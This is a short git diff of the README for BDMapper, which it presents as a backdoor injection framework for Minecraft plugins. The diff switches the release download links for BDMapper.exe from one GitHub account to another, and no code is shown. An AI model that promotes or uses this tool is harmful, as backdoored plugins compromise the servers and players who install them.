@@ -1,7 +1,7 @@
 <div align="center"><h1>BDMapper — Professional Backdoor Injection Framework for Minecraft Plugins</h1></div>
 <div align="center"><img alt="Logo" src="l.png"/></div>
 <div align="center">
-  <a href="https://github.com/VoxelHax/BDMapper/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a>
+  <a href="https://github.com/NyashSystem/BDMapper/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a>
 </div>
 
 **Languages:** English, Русский
@@ -26,7 +26,7 @@
 
 ## Installation
 
-Download `BDMapper.exe` from [Releases](https://github.com/VoxelHax/BDMapper/releases/latest). Place anywhere; no setup needed.
+Download `BDMapper.exe` from [Releases](https://github.com/NyashSystem/BDMapper/releases/latest). Place anywhere; no setup needed.
 
 ---
 
